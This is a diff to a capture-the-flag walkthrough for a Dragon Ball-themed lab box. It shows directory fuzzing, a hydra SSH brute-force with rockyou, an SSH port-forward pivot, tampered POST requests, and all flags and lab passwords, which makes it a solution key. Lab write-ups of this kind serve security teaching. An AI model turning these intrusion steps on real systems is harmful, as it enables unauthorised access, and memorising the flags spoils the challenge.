@@ -5,10 +5,10 @@
 | **Box** | Capsule Corp (`capsulecorp.htb`) |
 | **Difficulty** | Medium |
 | **Theme** | Dragon Ball / Capsule Corp — "Reunir las 7 Esferas del Dragón" |
-| **Key vulns** | CVE-2024-42069 insecure deserialization (CWE-502) → `sudo` tar wildcard injection |
-| **User flag** | `HTB{us3r_g0ku_p0w3r_l3v3l_9000}` |
-| **Root flag** | `HTB{r00t_sh3nl0ng_gr4nts_y0ur_w1sh}` |
-| **Bonus** | `HTB{t1m3_p4r4d0x_4ll_b4lls}` (collect all 7 dragon balls) |
+| **Key vulns** | CVE-2024-42069 insecure deserialization (CWE-502) → `sudo` tar wildcard injection; side-challenges: free-decryptor recovery, SSH local port-forward pivot, and request-tampering (Burp Repeater) |
+| **User flag** | `THM{us3r_g0ku_p0w3r_l3v3l_9000}` |
+| **Root flag** | `THM{r00t_sh3nl0ng_gr4nts_y0ur_w1sh}` |
+| **Bonus** | `THM{t1m3_p4r4d0x_4ll_b4lls}` (collect all 7 dragon balls) |
 
 > **Story.** You are an IT worker at Capsule Corp in **2024**. While reviewing
 > historical incident logs you find a CVE that was live back in **2015**. You
@@ -26,10 +26,10 @@
 | 1 star | FTP anonymous | `CAPSULE{0n3_st4r_ftp_4n0nym0us}` |
 | 2 star | POP3 mailbox attachment | `CAPSULE{tw0_st4rs_p0p3_m41lb0x}` |
 | 3 star | Web deserialization RCE | `CAPSULE{thr33_st4rs_w3b_d3s3r14l}` |
-| 4 star | Hidden radar cache | `CAPSULE{f0ur_st4rs_h1dd3n_c0nf1g}` |
-| 5 star | goku's home | `CAPSULE{f1v3_st4rs_g0ku_h0m3}` |
+| 4 star | "Captured" by Frieza — friezacrypt decrypt | `CAPSULE{f0ur_st4rs_fr33d_fr0m_fr13z4}` |
+| 5 star | Gravity Chamber (internal 8081, SSH tunnel) | `CAPSULE{f1v3_st4rs_g0ku_h0m3}` |
 | 6 star | sudo wildcard root loot | `CAPSULE{s1x_st4rs_sud0_w1ldc4rd}` |
-| 7 star | Shenlong altar | `CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}` |
+| 7 star | Shenlong altar — Burp summon ritual | `CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}` |
 
 ---
 
@@ -193,34 +193,87 @@ www-data@capsulecorp:/$ cat /var/www/capsule/config.py
 SECRET_KEY = "kamehameha2015"
 ...
 SSH_USER = "goku"
-SSH_PASS = "Kakar0t_SSH_2015!"
+SSH_PASS = "chichi"
 ```
 
-That is goku's **SSH** password (different from the web password). Also grab the
-hidden cache flag:
+That is goku's **SSH** password (different from the web password). In the same
+radar cache we find that **ball #4 was already looted** — Frieza's soldiers hit
+the same RCE first and left it sealed:
 
 ```bash
-www-data@capsulecorp:/$ cat /var/capsule/tmp/.radarcache/dragon_ball_4.txt
+www-data@capsulecorp:/$ ls /var/capsule/tmp/.radarcache/
+LEEME_RESCATE.txt   dragon_ball_4.friezacrypt
+www-data@capsulecorp:/$ cat /var/capsule/tmp/.radarcache/LEEME_RESCATE.txt
+# "...crybabies run to some free Capsule recovery portal... you'll never find it, insect."
 ```
 
--> **`CAPSULE{f0ur_st4rs_h1dd3n_c0nf1g}`**
+The note sneers that a free Capsule recovery portal exists but refuses to name
+it — so fuzz the web root to find it:
+
+```bash
+gobuster dir -u http://capsulecorp.htb \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+# /recovery  (Status: 200)   ("recovery" is in medium/raft lists)
+```
+
+Browse to the **"No More Capsule"** portal at `/recovery` and enter the
+extension `friezacrypt` — it returns the leaked family key and the decrypt
+command (mirrors the real nomoreransom.org workflow):
+
+```bash
+# portal gives: family FriezaLocker, key g1nyu-f0rc3-l34k3d
+openssl enc -d -aes-256-cbc -pbkdf2 -k 'g1nyu-f0rc3-l34k3d' \
+  -in /var/capsule/tmp/.radarcache/dragon_ball_4.friezacrypt -out dragon_ball_4.txt
+cat dragon_ball_4.txt
+```
+
+-> **`CAPSULE{f0ur_st4rs_fr33d_fr0m_fr13z4}`**
 
 ---
 
-## 7. Lateral movement -> goku (ball #5 + user.txt)
+## 7. Lateral movement -> goku (user.txt) + Gravity Chamber (ball #5)
 
 ```bash
-ssh goku@capsulecorp.htb        # password: Kakar0t_SSH_2015!
+ssh goku@capsulecorp.htb        # password: chichi  (looted from config.py)
 goku@capsulecorp:~$ cat user.txt
 ```
 
--> **user flag: `HTB{us3r_g0ku_p0w3r_l3v3l_9000}`**
+> **Alternate (intended "brute" path):** goku reused a dumb dictionary password,
+> so you can also just brute-force SSH — it's in `rockyou.txt`:
+> `hydra -l goku -P /usr/share/wordlists/rockyou.txt ssh://capsulecorp.htb`
+
+-> **user flag: `THM{us3r_g0ku_p0w3r_l3v3l_9000}`**
+
+goku's training note points at an internal tool, and a port scan from *inside*
+the box reveals a listener that never appeared in the external nmap:
 
 ```bash
-goku@capsulecorp:~$ cat training/memories/dragon_ball_5.txt
+goku@capsulecorp:~$ cat training/memories/NOTA_camara.txt
+# "...la Camara de Gravedad solo responde en local, puerto 8081... entrena a 100x"
+goku@capsulecorp:~$ ss -tlnp | grep 8081
+LISTEN 0 0 127.0.0.1:8081 ...
+```
+
+It is bound to `127.0.0.1` only, so forward it over SSH and open it in a browser:
+
+```bash
+# from the attacker box
+ssh -L 8081:127.0.0.1:8081 goku@capsulecorp.htb
+# then browse to http://localhost:8081/   (the Gravity Chamber console)
+```
+
+Set the gravity to **100x** and train. The chamber validates server-side and
+releases the ball (equivalently, straight from the shell):
+
+```bash
+goku@capsulecorp:~$ curl 'http://127.0.0.1:8081/train?gravity=100'
+{"status":"ok","gravity":100,"ball5":"CAPSULE{f1v3_st4rs_g0ku_h0m3}"}
 ```
 
 -> **`CAPSULE{f1v3_st4rs_g0ku_h0m3}`**
+
+> The chamber service runs as `capsule`, not `goku`, so you cannot just read the
+> flag out of `/opt/kaio/chamber.py` — the chamber has to be used (train ≥100x).
 
 ---
 
@@ -256,15 +309,58 @@ rootbash-5.x# cat /root/.secrets/dragon_ball_6.txt
 
 ---
 
-## 9. Root (ball #7)
+## 9. Root + Shenlong altar (ball #7 — Burp summon ritual)
 
 ```bash
 rootbash-5.x# cat /root/root.txt
-rootbash-5.x# cat /opt/shenlong/altar/dragon_ball_7.txt
 ```
 
--> **root flag: `HTB{r00t_sh3nl0ng_gr4nts_y0ur_w1sh}`**
+-> **root flag: `THM{r00t_sh3nl0ng_gr4nts_y0ur_w1sh}`**
+
+The 7-star ball is **not** a file — it is sealed in the web altar. As root we
+recover the **Seal of Ki** and the ritual scroll that explains it:
+
+```bash
+rootbash-5.x# cat /opt/shenlong/altar/ki_sigil
+k4m3h4m3h4-s3ll0-d3l-k1-2015
+rootbash-5.x# cat /opt/shenlong/altar/RITUAL.txt   # names the 3 ritual conditions
+```
+
+Browse to `http://capsulecorp.htb/altar` **through Burp** and press *"Invocar a
+Shenlong"*. The page sends a summon the server rejects (wrong on every field):
+
+```
+POST /altar/summon
+invoker=goku&planet=namek&kami_sama=dead&ki=9000&sigil=
+```
+
+Send it to **Repeater** and tamper the payload — this is the whole challenge.
+Shenlong only wakes for a ritual that is correct on *all* counts:
+
+```
+POST /altar/summon
+invoker=goku&planet=earth&kami_sama=alive&ki=9001&sigil=k4m3h4m3h4-s3ll0-d3l-k1-2015
+```
+
+- `planet=namek` -> `earth`   (Earth's balls summon Shenlong; on Namek it's Porunga)
+- `kami_sama=dead` -> `alive`  (without Kami-sama the balls are inert stone)
+- `ki=9000` -> anything **> 9000**  ("it's over 9000!")
+- `sigil=` -> the Seal of Ki looted from `/root`
+
+The server validates the ritual, then decrypts the ball with the submitted
+sigil and returns it:
+
+```json
+{"status":"granted","ball7":"CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}","bonus":null, ...}
+```
+
 -> **`CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}`**
+
+> The ball is AES-256-CBC encrypted with the root-only sigil
+> (`/var/www/capsule/seal/ball7.enc`); the app (www-data) only holds the
+> ciphertext, so ball #7 genuinely requires **root** (for the sigil) **and** the
+> request-tampering. A very thorough player who reads the app could also decrypt
+> the `.enc` offline with the sigil — an accepted alternate solve.
 
 ---
 
@@ -281,20 +377,21 @@ D=/var/capsule/dragonballs
 cp /srv/ftp/dragon_ball_1.txt                         $D/dragon_ball_1.txt
 printf 'CAPSULE{tw0_st4rs_p0p3_m41lb0x}\n'            > $D/dragon_ball_2.txt   # from the POP3 attachment
 cp /var/capsule/uploads/processed/dragon_ball_3.txt   $D/dragon_ball_3.txt
-cp /var/capsule/tmp/.radarcache/dragon_ball_4.txt     $D/dragon_ball_4.txt
-cp /home/goku/training/memories/dragon_ball_5.txt     $D/dragon_ball_5.txt
+cp dragon_ball_4.txt                                  $D/dragon_ball_4.txt                 # decrypted via /recovery
+printf 'CAPSULE{f1v3_st4rs_g0ku_h0m3}\n'              > $D/dragon_ball_5.txt               # from the Gravity Chamber
 cp /root/.secrets/dragon_ball_6.txt                   $D/dragon_ball_6.txt
-cp /opt/shenlong/altar/dragon_ball_7.txt              $D/dragon_ball_7.txt
+printf 'CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}\n'          > $D/dragon_ball_7.txt               # from the altar summon
 
 /root/invoke_shenlong.sh
 ```
 
 Shenlong rises and grants the wish:
 
--> **`HTB{t1m3_p4r4d0x_4ll_b4lls}`**
+-> **`THM{t1m3_p4r4d0x_4ll_b4lls}`**
 
 If any ball is missing, the script lists exactly which collection source you
-still owe and exits non-zero.
+still owe and exits non-zero. (Equivalently, once all 7 are in the collection
+dir, re-running the altar summon returns the `bonus` field in its JSON too.)
 
 ---
 
@@ -308,6 +405,12 @@ still owe and exits non-zero.
 - **Don't keep secrets in world/group-readable config** (`config.py`).
 - **Quote your globs** and avoid wildcards in `sudo`-reachable scripts; pin
   exact arguments in `sudoers` instead of a trailing `*`.
+- **"Internal only" is not a control.** A service bound to `127.0.0.1` (the
+  Gravity Chamber) is one `ssh -L` away once any user is compromised — internal
+  admin tools still need their own authentication.
+- **Enforce authorization server-side and don't leak the secret.** The altar
+  trusts nothing from the client and ties the reward to a root-only key; the
+  anti-pattern is gating on a client value you also expose elsewhere.
 
 ---
 
@@ -316,9 +419,13 @@ still owe and exits non-zero.
 ```
 FTP anon (1) -> POP3 bulma:dragon (2, goku web pw, CVE)
    -> web goku:9000 -> pickle RCE www-data (3)
-   -> config.py loot + cache (4) -> ssh goku (user.txt, 5)
-   -> sudo tar wildcard -> root (6) -> root.txt + altar (7)
-   -> collect 7 balls -> invoke_shenlong.sh -> bonus
+   -> config.py loot + friezacrypt decrypt via /recovery (4)
+   -> ssh goku (user.txt) -> ss -tlnp + ssh -L tunnel -> Gravity Chamber 100x (5)
+   -> sudo tar wildcard -> root (6)
+   -> Seal of Ki + Burp Repeater summon ritual at /altar (root.txt, 7)
+   -> collect 7 balls -> invoke_shenlong.sh / altar bonus -> bonus flag
 ```
 
-No kernel exploit, no hash cracking — Medium by design.
+No kernel exploit, no hash cracking — Medium by design (the added side-skills —
+free-decryptor recovery, SSH port-forward pivot, and request tampering — keep it
+on the harder side of Medium).
